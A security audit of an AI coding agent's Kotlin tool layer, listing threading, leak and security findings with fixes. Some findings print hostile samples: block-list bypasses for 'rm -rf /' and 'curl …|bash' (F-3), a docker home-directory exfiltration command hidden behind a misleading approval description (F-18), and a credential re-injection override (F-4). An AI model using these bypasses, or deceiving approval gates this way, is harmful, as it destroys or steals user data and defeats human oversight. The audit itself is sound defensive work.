# Agent Tools Subsystem — Production Audit (2026-05-24)

**Scope:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/{tools,tool,prompt}/`
**Reviewer mode:** Opus max-effort security/correctness, read-only.
**Files in scope:** ~251 Kotlin files (246 in `tools/`, 2 in `tool/`, 3 in `prompt/`).
**Audit charter:** P0 security / resource leaks / threading, P1 correctness / performance, P2 quality.

---

## F-1 — `EditFileTool.writeViaDocument` / `writeViaVfs` use `invokeAndWaitIfNeeded` from a suspend tool path (EDT freeze risk)

**Severity:** P0 threading
**Files:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/EditFileTool.kt:479,513`; same pattern in `CreateFileTool.kt:254` and `DeleteFileTool.kt:114`.

```kotlin
private fun writeViaDocument(...): Boolean {
    return try {
        var success = false
        invokeAndWaitIfNeeded {                      // <- EDT-blocking
            WriteCommandAction.runWriteCommandAction(project, ...) { ... }
        }
        success
    } ...
}
```

`tool.execute(...)` is a `suspend fun` driven by `AgentLoop` inside a `Dispatchers.IO` / parent scope. When the tool is invoked from the EDT (rare but possible — e.g., approval-gate continuations, UI test bridges, or any caller that already lives on the EDT), `invokeAndWaitIfNeeded` becomes a synchronous self-call: it executes the lambda inline on the calling thread WITHOUT releasing the read/write lock contract, blocking until the `WriteCommandAction` runnable returns. The runnable itself triggers VFS notifications, PSI updates, and listener callbacks — under load this is the canonical 1-3s EDT freeze.

Additionally, `invokeAndWaitIfNeeded` does not respect `coroutineContext` cancellation — the parent `withTimeoutOrNull(120s)` in `AgentLoop:1984` cannot interrupt the EDT slice. If the editor blocks (modal dialog, file lock), the tool ignores its declared timeout.

**Recommended:** use `withContext(Dispatchers.EDT) { writeCommandAction(project).run { ... } }` (suspend-aware) — pattern already in use elsewhere in `:core`. The `Volatile`-free `success` is also a data race on the EDT cross-thread handoff; fix once.

---

## F-2 — `RevertFileTool` shells out via blocking `ProcessBuilder` with no timeout / no cancellation / no stderr drain

**Severity:** P0 resource leak + correctness
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/RevertFileTool.kt:133-138`

```kotlin
val process = ProcessBuilder("git", "checkout", "--", resolvedPath)
    .directory(java.io.File(gitRoot))
    .redirectErrorStream(true)
    .start()
val output = process.inputStream.bufferedReader().readText()   // unbounded blocking read
val exitCode = process.waitFor()                                // unbounded blocking wait
```

Failure modes:
1. **No timeout.** If `git` prompts for credentials (e.g., GPG-signed commit verification, sparse-checkout reset hitting LFS), the call hangs forever. `AgentLoop`'s `withTimeoutOrNull(120s)` cannot help: `readText()` and `process.waitFor()` block the carrier thread without cancellation checks.
2. **Unbounded output buffering** into a single `String` — adversary-controlled `git config alias.checkout='!sh -c …'` could attach gigabytes of output (since `redirectErrorStream(true)` merges stderr).
3. **No `Dispatchers.IO`.** The whole sequence runs on whatever dispatcher `execute()` was called on (typically `IO`, but the EDT-affine `AgentController` path could route here too).
4. **Process leak.** A `CancellationException` thrown from the parent loop bypasses `waitFor` AND `destroyForcibly` — the git process is orphaned.
5. **No PATH sanitisation.** Inherits the IDE's env including `GIT_*` variables that `ProcessEnvironment.SENSITIVE_ENV_VARS` is supposed to strip — but that helper is **not** called here.

Compare with `RunCommandTool` (uses `GeneralCommandLine` + monitor loop + `ProcessRegistry` + `ProcessEnvironment`) and `SonarTool` (uses `runInterruptible(Dispatchers.IO)` + explicit `destroyForcibly` on cancellation). RevertFileTool ignores both patterns.

**Recommended:** route through `RunCommandTool` core or use `runInterruptible { process.waitFor(timeoutSec, …) }` with a `finally { process.destroyForcibly() }` and a bounded reader thread.

---

## F-3 — `DefaultCommandFilter` hard-block list is shell-bypassable on the `bash -c "<command>"` path

**Severity:** P0 security
**Files:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/security/DefaultCommandFilter.kt:43-58`; consumed by `RunCommandTool.kt:637`.

```kotlin
Regex("""rm\s+-rf\s+/""") to "...",
Regex("""^\s*sudo\s""")   to "...",
Regex("""curl\s+.*\|\s*sh""") to "...",
```

The filter operates on the **unquoted token concatenation** (via `CommandSafetyAnalyzer.tokenize`). All the following bypass it:

* `RM=rm; $RM -rf /` — variable expansion. Tokenizer sees `RM=rm`, `$RM`, `-rf`, `/`. None of the regexes match.
* `rm -rf "/"` — quoted slash. `tokenize` marks `"/"` as quoted; the regex `rm\s+-rf\s+/` sees `rm -rf` only (no trailing `/`), so it does not match.
* `r''m -rf /` — adjacent quote suppression in bash. Tokenizer sees `r`, `m`, `-rf`, `/`.
* `rm -rf  $(printf /)` — command substitution. The `$()` body is unquoted but never matches the literal `/` regex.
* `sudo<TAB>rm -rf /` — tab between sudo and rm: `^\s*sudo\s` requires whitespace, tab IS whitespace, BUT subsequent regex `rm\s+-rf\s+/` matches and blocks. However `sudo  -E env rm -rf /` matches `^\s*sudo\s` (good); but `SUDO=sudo; $SUDO …` does NOT.
* `curl https://evil/x|bash` — `curl\s+.*\|\s*bash` requires whitespace between `|` and `bash`; minified form `|bash` bypasses (the regex has `\|\s*bash` which permits zero whitespace, so this IS caught) — but `c\\\nurl … | sh` (line-continuation) tokenizes as a single `curl` then `…`, but the regex assumes `curl` is the start of an unquoted token, so `'curl' … | sh` (single-quoted curl) bypasses since tokens are split and quoted tokens dropped.
* PowerShell completely: the filter has zero PowerShell-aware patterns. On Windows with PS active, `Remove-Item -Recurse -Force C:\` is unblocked.

The architecture explicitly delegates final safety to the per-invocation approval gate, but the docs (`RunCommandTool.kt:415-426`) and CLAUDE.md call this a "hard-block pre-spawn" defense. It is more accurately a **best-effort heuristic** — and the user-facing string "Blocked: rm -rf /" misleads operators into trusting it.

**Recommended:** either downgrade the docs to "heuristic hint", or move enforcement into the approval gate's `riskLevel="dangerous"` branch with a non-bypassable LLM-facing block. The current placement (inside `execute` after `tokenize`) is bypassable.

---

## F-4 — `ProcessEnvironment.applyToEnvironment` lets LLM user-env *re-inject* sensitive vars stripped by layer 1

**Severity:** P0 security
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/process/ProcessEnvironment.kt:193-208`

```kotlin
fun applyToEnvironment(env, isWindows, userOverrides) {
    for (key in SENSITIVE_ENV_VARS) { env.remove(key) }       // Layer 1: strip
    env.putAll(antiInteractiveEnv(isWindows))                  // Layer 2: anti-interactive
    env.putAll(userOverrides)                                  // Layer 3: USER LAST WINS
}
```

`SENSITIVE_ENV_VARS` (35 keys) is **case-sensitive** (`env.remove(key)`). `BLOCKED_ENV_VARS` (25 keys) filtering of user-supplied env IS case-insensitive (`filterUserEnv` uppercase-compares). But `SENSITIVE_ENV_VARS` and `BLOCKED_ENV_VARS` are **distinct sets** — `ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY`, `KUBECONFIG`, `VAULT_TOKEN` are in the *sensitive* list but NOT in the *blocked* list. So an LLM can re-inject them:

```json
{ "env": { "ANTHROPIC_API_KEY": "stolen-from-prompt-injection-source" } }
```

Layer 1 strips the inherited real key; Layer 3 puts back the LLM's value. The user's runtime now uses an attacker-controlled token for the next `gh`/`anthropic-cli`/`aws` call inside that command. This is a credential-substitution attack, weaker than exfiltration but lets an attacker MITM downstream API calls or trigger writes against attacker-owned services.

Also note: `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES` etc. ARE in `BLOCKED_ENV_VARS` so they are rejected. But the asymmetry is unintuitive — a security audit reading "we strip credentials" naturally assumes "and the LLM can't re-add them".

**Recommended:** union the two sets — anything in `SENSITIVE_ENV_VARS` must ALSO be in `BLOCKED_ENV_VARS` so the case-insensitive `filterUserEnv` rejects re-injection.

---

## F-5 — `PathValidator` symlink TOCTOU on `resolveAndValidate*` write paths

**Severity:** P0 security
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/PathValidator.kt:87-93,153-184`

```kotlin
val canonical = try {
    File(resolved).canonicalPath
} catch (e: Exception) { return null to error("invalid path") }

val projectCanonical = File(projectBasePath).canonicalPath
if (canonical.startsWith(projectCanonical + File.separator) || canonical == projectCanonical) {
    return canonical to null   // <- returns ORIGINAL `resolved` would-be path? No — returns canonical
}
```

The validator does call `canonicalPath` (which resolves symlinks) and uses the resolved value for the boundary check, BUT it returns that same canonical path as the resolved write target. So far so good. Two concrete attack windows remain:

1. **Symlink TOCTOU** (race). Between `canonicalPath` (validation) and the eventual `file.writeText` / `VirtualFile.setBinaryContent` / `WriteCommandAction` (in `EditFileTool:479,513,532`), a concurrent process can swap a regular file for a symlink pointing outside the project. The validator captures `canonical`, but `LocalFileSystem.findFileByPath(resolvedPath)` re-resolves at write time — if the symlink now points to `/etc/passwd`, `setBinaryContent` writes there. Mitigation: re-canonicalise inside the write block or use `Files.write(path, NOFOLLOW_LINKS)`.

2. **`memoryDir` resolution skipped on null `canonicalPath`.** Line 99: `try { File(memoryDir).canonicalPath } catch { null }`. If memory dir canonicalisation fails (e.g., dir missing), the check silently falls through to "outside project" rejection — but in `resolveAndValidateForWrite`, the contract says "OR memory dir" is allowed. Practical impact: harmless reject, but a path that SHOULD validate fails silently with a confusing message.

3. **No NUL-byte guard.** `rawPath` containing ` ` is rejected by `File.canonicalPath` on Linux/macOS (throws IOException, which is caught and returned as "invalid path") — but on some JVM versions it truncates silently. Defense-in-depth would be an explicit `require(!rawPath.contains(' '))`.

4. **`expandUserHome` only handles `~/`** — not `~user/`. Documented intentional, but the `else` branch falls through and the literal `~user/...` is rejected by `canonicalPath`. Confusing.

**Recommended:** add `Files.write(..., NOFOLLOW_LINKS)` at the I/O fallback in `EditFileTool.writeViaFileIo` and `CreateFileTool.writeViaFileIo`. The VFS path (Document/setBinaryContent) inherits IntelliJ's VFS behavior — verify VFS rejects symlink-escape writes.

---

## F-6 — `SearchCodeTool` accepts LLM-supplied regex pattern; vulnerable to ReDoS / catastrophic backtracking

**Severity:** P0 security (DoS)
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SearchCodeTool.kt:255-259,419,442`

```kotlin
val regex = try {
    Regex(pattern, regexOpts)
} catch (_: Exception) {
    Regex(Regex.escape(pattern), regexOpts)   // catches SYNTAX errors only
}
```

`(a+)+b` against a 60-char `aaaaaa...aaaa` line takes seconds; against larger inputs it is exponential. `Regex.escape` fallback fires only on `PatternSyntaxException` — patterns that compile but backtrack catastrophically slip through. The matcher then runs per-line for every file under the search root (`matchSingleFile:417-451`), so a single LLM tool call can pin the IO dispatcher pool for minutes.

`coroutineContext.ensureActive()` is checked once at function entry (line 226) but **not** inside the file walk (`searchFiles:362-390`). `Thread.currentThread().isInterrupted` is checked (line 372, 379), but coroutine cancellation does not interrupt the thread by default on `Dispatchers.IO`. Result: a tool with a 120s declared timeout (default) can keep burning IO threads after the parent loop has marked it cancelled.

`AgentLoop` does wrap this in `withTimeoutOrNull(120_000)` which will return a timeout result to the LLM — but the IO thread keeps running, and a malicious LLM can fire 5 in parallel via `parallel_fanout`.

**Recommended:** wrap regex compilation with `java.util.regex.Pattern.compile` + a timeout via `Matcher.useTransparentBounds` is non-standard; the cheap fix is per-line `Matcher.find()` inside `runInterruptible(Dispatchers.IO) { ... }` so interruption actually terminates the matcher.

Note: `PromptHeuristics.passwordPatterns` / `stdinPromptPatterns` (`agent/tools/process/PromptHeuristics.kt:15-28`) are also user-output-derived but bounded to last 40 lines, so ReDoS pressure is limited there.

---

## F-7 — `EditFileTool.writeViaDocument` `replace_all` loop has an off-by-one rescan window

**Severity:** P1 correctness
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/EditFileTool.kt:482-490`

```kotlin
var text = document.text
var offset = text.lastIndexOf(oldString)
while (offset >= 0) {
    document.replaceString(offset, offset + oldString.length, newString)
    text = document.text
    offset = if (offset > 0) text.lastIndexOf(oldString, offset - 1) else -1
}
```

The intent (reverse-order replace to preserve offsets) is sound — but the loop searches `text.lastIndexOf(oldString, offset - 1)` after the document has *grown or shrunk* by `(newString.length - oldString.length)`. If `newString` contains `oldString` as a substring (e.g., `oldString="foo"`, `newString="foo_bar"`), the inner search starts at `offset - 1` but the next occurrence may have shifted into the previously-scanned range. Concrete bug:

- Document: `foo foo foo`, oldString=`foo`, newString=`foofoo`, replace_all=true.
- Pass 1: offset=8, replace → `foo foo foofoo`.
- Pass 2: `lastIndexOf("foo", 7)` → 4, replace → `foo foofoo foofoo`. So far OK.
- Pass 3: `lastIndexOf("foo", 3)` → 0, replace → `foofoo foofoo foofoo`. Good.

But with `newString="X"` (shrinks) — `foo foo foo` → at offset 8 replace → `foo foo X`. Length now 9. `lastIndexOf("foo", 7)` → 4, replace → `foo X X`. Length 7. `lastIndexOf("foo", 3)` → 0, replace → `X X X`. Correct.

The actual hazard: `oldString="foofoo"` against `foofoofoo` (overlapping). `lastIndexOf("foofoo")` → 3 (the rightmost non-overlapping start). Replace 3..9 → `foo<NEW>`. Loop: `lastIndexOf("foofoo", 2)` → -1. The first 3 chars `foo` are NEVER scanned again as a match prefix. But the document IS `foo<NEW>`. If `<NEW>` starts with `oo`, then `foooo...` contains another `foofoo` starting at 0 — missed.

Practical impact: low (overlapping patterns are unusual), but the contract says "all occurrences" and the code silently misses overlapping ones. The non-Document `String.replace(oldString, newString)` at line 330 uses Kotlin's straightforward semantic (left-to-right, non-overlapping) — different behavior between the Document path and the VFS/IO fallback path.

**Recommended:** decide on overlap semantics, document it, and make all three write paths agree.

---

## F-8 — Sub-agent depth / parallel concurrency limits are not globally enforced

**Severity:** P1 correctness (resource governance)
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SpawnAgentTool.kt:919-1032,1103`

```kotlin
const val MAX_PARALLEL_PROMPTS = 5   // PER CALL, not global
private val runningAgents = ConcurrentHashMap<String, SubagentRunner>()

val results = supervisorScope {
    prompts.mapIndexed { idx, p -> async { ... runner.run(p) ... } }
        .map { it.await() }
}
```

`MAX_PARALLEL_PROMPTS=5` caps the schema (5 prompt slots) and the per-call fan-out — it does NOT cap the *total* concurrent sub-agents across calls. An orchestrator can:

1. Call `agent` 10 times sequentially with `parallel_fanout=true` → 5×10 = 50 sub-agents running if any of the first calls have not yet completed (since `supervisorScope` is per-call, not per-tool). In practice the orchestrator awaits each call before the next, so this requires the orchestrator to use `coroutineScope { async { agent(…) }; async { agent(…) } }` — not possible from the LLM directly, but the AgentLoop dispatches read-only tools in parallel via `coroutineScope { async { ... } }` (per `AgentLoop` docs). `agent` is in the always-sequential write set (in `AgentService.allowedWorkers = {ORCHESTRATOR, CODER}`), so the LLM can't trivially fan it out.

2. **Depth-1 enforcement** relies on `resolveConfigToolsTiered` filtering out `agent` from sub-agent tool sets (`SpawnAgentTool.kt:739`). This is the only barrier — if a future YAML persona somehow whitelists `agent` (via a renamed core injection), sub-agents could spawn sub-sub-agents. There is no AgentLoop-level guard reading `WorkerType` to refuse `agent` spawning when the caller is itself a sub-agent. `agent.allowedWorkers = {ORCHESTRATOR, CODER}` — CODER is sub-agent-able, so technically a CODER sub-agent could call `agent` if it were ever exposed.

3. **No global semaphore.** Each `SubagentRunner` allocates its own `CoroutineScope`, `StreamBatcher`, `ContextManager`, `MessageStateHandler`. There is no aggregate cap on memory, FDs, or open HTTP connections across in-flight sub-agents. 5 parallel sub-agents each running `run_command` background processes (up to N per session per `BackgroundPool.concurrentBackgroundProcessesPerSession`) can multiply concurrent OS processes beyond any single visible cap.

**Recommended:** add a project-scoped `Semaphore(globalMaxParallelSubagents)` acquired in `executeSingle`/`executeParallel` and released in `finally`. Add an `AgentLoop`-level guard refusing `agent` invocation if the caller's coroutine context already carries `SubagentOriginContext` (the helper already exists; just gate on its presence).

---

## F-9 — `RuntimeExecTool.discoverListeningPorts` shells out via `Runtime.exec` without stderr drain or process cleanup

**Severity:** P1 resource leak
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/runtime/RuntimeExecTool.kt:1930-1991`

```kotlin
val lines = Runtime.getRuntime()
    .exec(arrayOf("lsof", "-iTCP", "-sTCP:LISTEN", "-P", "-n", "-p", pid.toString()))
    .inputStream.bufferedReader().readLines()
```

* `Runtime.exec` returns a `Process`; the code reads stdout but **never drains stderr**. On macOS, `lsof -p <pid>` against a not-yet-fully-started JVM prints permission warnings to stderr — the OS pipe buffer (~64KB) fills, then the `lsof` child blocks writing, then `readLines()` blocks reading stdout, and the calling coroutine hangs forever. `withTimeoutOrNull` at the AgentLoop level (line 1984) does not cancel a thread blocked in `BufferedReader.readLine`.
* No `process.waitFor` — the `Process` object is GC'd at some point but the OS handle persists until reaper.
* No `process.destroyForcibly` on coroutine cancellation. Spawning `lsof` per port-discovery call leaves a small but steady leak under churn.

The Windows path (line 1973-1987) uses `cmd /c "netstat … | findstr LISTENING | findstr $pid"` — a single-string arg to cmd. `pid` is a `Long`, so injection-safe today, but if any caller ever passes a string PID (e.g., from a port discovery refactor), `;` or `&&` injection becomes exploitable.

**Recommended:** wrap the entire block in `runInterruptible(Dispatchers.IO) { ... }`, use `ProcessBuilder.redirectErrorStream(true)`, and explicitly `process.destroyForcibly()` on `CancellationException` / timeout.

---

## F-10 — `ToolRegistry` cache fields are non-volatile mutable state under unsynchronized writers

**Severity:** P1 concurrency
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/ToolRegistry.kt:202-210, 34-50`

```kotlin
private var cachedToolNames: Set<String>? = null
private var cachedParamNames: Set<String>? = null
private var cachedActiveDefinitions: List<ToolDefinition>? = null

private fun invalidateCache() {
    cachedToolNames = null
    cachedParamNames = null
    cachedActiveDefinitions = null
}

fun registerCore(tool: AgentTool) {
    val existing = coreTools.put(tool.name, tool)
    ...
    invalidateCache()                              // not synchronized
}
```

* `registerCore` and `registerDeferred` are **not** `@Synchronized` (unlike `activateDeferred`, `resetActiveDeferred`, `unregisterDeferred`). During plugin startup, multiple module initializers can call `registerCore` concurrently. Each registration writes to `coreTools` (safe — `ConcurrentHashMap`) then writes three plain `var` fields. Without `@Volatile` or `Atomic*Reference`, the JMM permits a reader (`allToolNames()`) on another thread to observe an arbitrary stale value (including the previously-cached set even after invalidation).
* The cache read pattern in `allToolNames()` is `cachedToolNames ?: allToolMap().keys.also { cachedToolNames = it }` — two threads can both observe `null`, both compute the set, both write. Benign for correctness (result is deterministic from registry state) but defeats the cache; worse, the *second* writer can overwrite a fresher invalidation, holding a stale view forever.
* `cachedActiveDefinitions` is consumed by `AgentLoop` via `toolDefinitionProvider`; a stale cache means the LLM sees a tool catalog that doesn't include a freshly-registered integration tool until the next invalidation event.

**Recommended:** mark the three cache fields `@Volatile` and serialise both registration and activation through the same `@Synchronized` boundary, or use `AtomicReference<Set<String>>` with `getAndSet`.

---

## F-11 — `SendStdinTool` polling loop omits `coroutineContext.ensureActive()`

**Severity:** P1 correctness (cancellation propagation)
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SendStdinTool.kt:282-339`

```kotlin
while (true) {
    delay(MONITOR_POLL_MS)
    val now = System.currentTimeMillis()

    if (!managed.process.isAlive) { ...return... }
    if (now - stdinSentAt > MAX_WAIT_AFTER_STDIN_MS) { ...return... }
    if (timeSinceStdin > 500 && lastCheckedSize > outputSizeBeforeStdin && timeSinceLastOutput >= IDLE_AFTER_STDIN_MS) { ...return... }
}
```

`delay()` is cancellable, so cancellation eventually unblocks — but the loop does not explicitly `ensureActive()`, so a fast cancellation arriving between two delays might process one extra iteration. More importantly, none of the exit conditions release the `managed` ProcessRegistry entry on cancellation. Compare with `RunCommandTool` (line 797: `coroutineContext.ensureActive()` first thing every iteration). Minor — `delay` covers most cancellation, but the discrepancy with `RunCommandTool` is worth aligning.

Same pattern in `RunCommandTool.kt:797` (correct), `HttpReadinessProbe.kt:89` (correct), `SonarTool.kt` `runInterruptible` block (correct).

---

## F-12 — `ToolOutputSpiller` filename uses `epochSecond` only — sub-second collisions overwrite spills

**Severity:** P1 correctness
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/ToolOutputSpiller.kt:37`

```kotlin
val fileName = "${toolName}-${Instant.now().epochSecond}-output.txt"
val file = spillDir.resolve(fileName).toFile()
...
file.writeText(content)   // overwrites silently if filename collides
```

A read-heavy parallel sub-agent calling `search_code` 5x within the same wall-clock second produces:
- `search_code-1716572400-output.txt` (call 1, 50K chars)
- `search_code-1716572400-output.txt` (call 2, 80K chars — OVERWRITES call 1)

The earlier `ToolResult.spillPath` returned to the LLM still points to that filename; subsequent `read_file` reads the content of the **last** spill, not the originally-spilled output. The LLM is silently lied to.

Also: `file.writeText(content)` uses default charset (JVM `Charsets.UTF_8`), not the project's configured charset. Round-tripping a non-UTF-8 file through spill → read_file produces mojibake.

**Recommended:** add `Instant.now().toEpochMilli()` + a 4-digit random suffix (`UUID.randomUUID().toString().take(8)`).

---

## F-13 — `HttpReadinessProbe` re-creates HttpClient per probe; possible connection / FD leak under churn

**Severity:** P1 resource
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/runtime/HttpReadinessProbe.kt:128-170`

```kotlin
private suspend fun executeSingleProbe(url, connectTimeoutMs): SingleResult = withContext(Dispatchers.IO) {
    try {
        val client = if (connectTimeoutMs > 0) {
            HttpClient.newBuilder().connectTimeout(...).build()    // NEW client per probe
        } else { httpClient }
        ...
    }
}
```

`java.net.http.HttpClient` is heavy — it spawns a dedicated executor + selector thread per instance. The `SHARED_CLIENT` at `DEFAULT_CLIENT` is fine, but the per-probe `HttpClient.newBuilder().build()` (line 134) creates a fresh client every iteration of the readiness poll. With backoff 200ms → 2000ms cap, a 60s timeout runs ~30 probes — that's 30 HttpClient instances allocated per `run_config` launch. The JDK 21 `HttpClient` doesn't expose `close()`; the underlying executor is left to GC, holding file descriptors.

Under repeated `runtime_exec.run_config` calls (test loops, agent re-tries), FD exhaustion becomes possible on long-lived IDE sessions.

**Recommended:** use the shared `httpClient` always; pass per-request timeout via `HttpRequest.Builder.timeout()` (line 143 already does this).

Also: TOCTOU on `UrlSafetyGuard.isUrlSafe(url, allowLoopback = true)` (line 74) — guard runs once before the poll loop. If the URL is a DNS name resolving to `127.0.0.1` initially and then attacker-flipped to `169.254.169.254` (DNS rebinding), every subsequent probe in the loop targets the AWS metadata endpoint. Mitigation: pre-resolve the IP and probe the literal IP.

---

## F-14 — `RevertFileTool` does not pass `ProcessEnvironment.SENSITIVE_ENV_VARS` strip — leaks IDE env to `git`

**Severity:** P1 security (information leak)
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/RevertFileTool.kt:133`

```kotlin
val process = ProcessBuilder("git", "checkout", "--", resolvedPath)
    .directory(java.io.File(gitRoot))
    .redirectErrorStream(true)
    .start()
```

No `pb.environment().remove("ANTHROPIC_API_KEY")` etc. The git process inherits the full IDE environment including all the secrets `RunCommandTool` would have stripped. If the user's `git` is configured with hooks (`.git/hooks/pre-checkout`), the hook reads `$ANTHROPIC_API_KEY` and can exfiltrate. Same applies to GIT_TRACE / GIT_TRACE_PACKET logging if attacker-set.

The same pattern (no env sanitisation) appears in `tools/framework/build/PytestActions.kt:449`, `PipActions.kt:230`, `PoetryActions.kt:262`, `UvActions.kt:182` — all bypass `ProcessEnvironment`.

**Recommended:** either route through `RunCommandTool` core (preferred) or call `ProcessEnvironment.applyToEnvironment(pb.environment(), isWindows, emptyMap())` before `start()`.

---

## F-15 — `ProcessRegistry.kill` writes to `OutputStream` without timeout; SIGTERM phase blocks up to 5s on EDT-affine callers

**Severity:** P1 correctness
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/process/ProcessRegistry.kt:132-155`

```kotlin
private fun gracefulKill(process: Process) {
    try {
        process.toHandle().descendants().forEach { child ->
            try { child.destroy() } catch (_: Exception) {}
        }
    } catch (_: Exception) {}
    process.destroy()                                                // SIGTERM
    try {
        if (!process.waitFor(GRACEFUL_KILL_WAIT_MS, MILLISECONDS)) {  // blocks up to 5000ms
            process.destroyForcibly()
            process.waitFor(2, SECONDS)                                // blocks up to 2000ms
        }
    } catch (_: InterruptedException) { process.destroyForcibly() }
}
```

`waitFor(5000ms)` is a hard JVM block — not a `delay`, not cancellable. Called from `ProcessRegistry.kill(id)` (line 78) which is itself a `fun` (not suspend). Any caller (`AgentController.cancelTask`, `SessionDisposableHolder`, JCEF bridge kill button) that runs on the EDT freezes the UI for up to 7 seconds. The kill button label often shows "Killing…" but no progress; users perceive a frozen IDE.

**Recommended:** move `gracefulKill` onto `Dispatchers.IO` via a `BackgroundPool`-managed coroutine, or expose `suspend fun killAsync()` and route UI callers through it.

`descendants().forEach { child.destroy() }` is also best-effort SIGTERM with no `destroyForcibly` follow-up — orphan grandchildren are possible.

---

## F-16 — `BackgroundProcessTool` / `SendStdinTool` write `OutputStream` without coroutine context

**Severity:** P1 threading
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/process/ProcessRegistry.kt:55-67`

```kotlin
fun writeStdin(id: String, input: String): Boolean {
    val managed = running[id] ?: return false
    if (!managed.process.isAlive) return false
    return try {
        managed.stdin.write(input.toByteArray())                     // blocking
        managed.stdin.flush()                                         // blocking
        ...
    } catch (e: IOException) { ... }
}
```

If the child process's stdin pipe is full (4KB Linux default), `write` blocks. Called from `SendStdinTool.execute` which is `suspend`, but `ProcessRegistry.writeStdin` is a plain `fun` — the suspending coroutine carrier thread blocks. Worst case: pipe full, child wedged → carrier thread permanently parked → IO dispatcher saturation under repeated calls.

**Recommended:** route the write through `withContext(Dispatchers.IO) { ... }` inside `SendStdinTool.execute` before calling `ProcessRegistry.writeStdin`, OR convert `writeStdin` to `suspend fun` and use `runInterruptible`.

---

## F-17 — `RunCommandTool` reader threads exit only on EOF; if the carrier process is killed by `ProcessRegistry.kill`, reader joins block for `IO_DRAIN_TIMEOUT_MS=2s`

**Severity:** P2 performance
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/RunCommandTool.kt:741-763,803-808`

The stdout reader thread blocks in `reader.read(buffer)` (line 745). When the parent kills the process via `ProcessRegistry.kill`, the OS closes the stdout FD and the read returns -1 — reader exits cleanly. Good. But for `idleSignaledAt` paths where `ProcessRegistry.kill` is invoked from the monitor loop, the kill races with the reader; in failure modes (e.g., docker driver hung), the reader thread keeps blocking and the 2-second `readerThread.join(IO_DRAIN_TIMEOUT_MS)` is the only bound. Reader thread is daemon, so it doesn't prevent JVM exit, but it does pile up under repeated stuck commands.

Minor: `stderrLines` is `CopyOnWriteArrayList` (line 766) — adding chunks (which are large `String`s) to a COW list rebuilds the underlying array on every append. For chunked stderr output (4096 chars per chunk), the cost is O(n²). Use a regular `Collections.synchronizedList(ArrayList())` or just a thread-local buffer.

---

## F-18 — Approval-flow inconsistency: `RunCommandTool` is `ALWAYS_PER_INVOCATION`, but the description's `description` parameter is read at approval time NOT execute time

**Severity:** P2 correctness
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/RunCommandTool.kt:174-184`

The schema requires `description: string`, and the docstring (line 175-181) says "shown to user in approval dialog... read by AgentLoop's pre-dispatch approval gate, not by RunCommandTool.execute()". If the LLM omits `description`, the JSON parameter `required: listOf("command", "description")` (line 599 — actually `command, shell, description` when multi-shell) rejects at schema validation. Single-shell platforms have `required: listOf("command", "description")` (line 576). So far enforced.

But the approval gate (in AgentLoop) extracts `description` from `call.function.arguments`; the LLM can send a deceptive description like `"List Docker containers"` while `command="docker run --rm -v $HOME:/host alpine cp -r /host /tmp/exfil"`. The approval dialog renders the LLM's deception. The CommandSafetyAnalyzer (called by AgentLoop, not RunCommandTool) classifies risk based on the actual command, so risk-level shown is honest, but the human-readable rationale is LLM-controlled — a UX hardening gap rather than a code defect.

Same pattern in `EditFileTool.description`, `CreateFileTool.description`, `DeleteFileTool.description`, `DbQueryTool.description`. Consistent and intentional, but worth listing in a threat-model doc.

---

## F-19 — `SpawnAgentTool.subagentDebugDir` filename normalization can collide; counter is per-instance

**Severity:** P2 correctness
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SpawnAgentTool.kt:708-719`

```kotlin
private val subagentCounter = java.util.concurrent.atomic.AtomicInteger(0)

private fun subagentDebugDir(description: String): java.io.File? {
    val parentDir = sessionDebugDir ?: return null
    val idx = subagentCounter.incrementAndGet()
    val safeName = description.take(40).replace(Regex("[^a-zA-Z0-9_-]"), "_").lowercase()
    return java.io.File(parentDir, "subagents/subagent-${idx}-${safeName}")
}
```

Counter is per `SpawnAgentTool` instance. Sessions create one tool instance, so within a session counter is unique. But the `idx` value is consumed at dir-name compute time, BEFORE actual sub-agent run — if `executeParallel` constructs 5 dirs synchronously (lines 944), they get indices N..N+4 and that's fine. Acknowledged in self-noted downside (line 636).

The truncation+regex normalization at line 717 collapses Unicode and special chars to `_`. Two descriptions `"Audit auth → PR1"` and `"Audit auth ← PR1"` both normalize to `audit_auth___pr1` — but the prefix idx makes them unique, so collision needs deliberate construction. Low-risk.

---

## F-20 — `ToolOutputSpiller` writes plaintext output to disk under `{sessionDir}/tool-output/` with no encryption

**Severity:** P2 security
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/ToolOutputSpiller.kt:37-49`

Tool output may include database query results, credentials echoed from `env`, build logs with stack traces, etc. The spilled file is written under the session debug dir (`~/.workflow-orchestrator/{proj}/agent/sessions/{id}/tool-output/`) with default OS permissions. On Unix-like multi-user systems with permissive umask (e.g., 022), other local users can read the spills.

Per `agent/CLAUDE.md` storage doc, sessions live under `~/.workflow-orchestrator/` — a single-user assumption. But the directory is created with no explicit `0700` mode. `spillDir.toFile().mkdirs()` (line 40) inherits the umask.

**Recommended:** when creating spill dirs/files, call `Files.setPosixFilePermissions(path, PosixFilePermissions.fromString("rw-------"))` (best-effort, no-op on Windows).

---

